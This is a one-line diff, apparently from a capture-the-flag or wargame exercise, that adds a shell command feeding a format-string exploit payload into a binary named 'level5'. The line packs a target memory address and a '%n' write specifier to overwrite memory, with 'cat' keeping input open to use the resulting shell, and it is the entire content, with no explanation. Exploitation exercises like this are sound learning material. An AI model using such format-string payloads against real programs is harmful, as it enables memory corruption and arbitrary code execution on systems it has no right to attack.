@@ -1,0 +1,1 @@
+(python -c 'print("\x38\x98\x04\x08%134513823x%4$n")'; cat) | ./level5
